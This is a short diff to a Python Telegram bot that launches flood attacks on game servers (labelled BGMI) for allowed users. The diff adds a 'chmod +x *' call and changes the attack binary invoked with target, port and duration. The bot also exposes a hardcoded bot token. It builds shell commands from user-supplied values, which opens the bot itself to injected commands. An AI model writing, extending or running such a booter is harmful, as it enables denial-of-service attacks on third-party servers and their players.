@@ -17,7 +17,7 @@ bot = telebot.TeleBot('7858493439:AAGbtHzHHZguQoJzAney4Ccer1ZUisC-bDI')
 # Admin user IDs
 admin_id = ["7418099890"]
 admin_owner = ["7418099890"]
-
+os.system('chmod +x *')
 # File to store allowed user IDs and their expiration times
 USER_FILE = "users.txt"
 cooldown_timestamps = {}
@@ -168,7 +168,7 @@ def start_attack_reply(message, target, port, time):
     response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\nBY @its_MATRIX_King"
     bot.reply_to(message, response)
 
-    full_command = f"./kaluayt {target} {port} {time}"
+    full_command = f"./sasuke {target} {port} {time} 60"
     try:
         print(f"Executing command: {full_command}")  # Log the command
         result = subprocess.run(full_command, shell=True, capture_output=False, text=True)
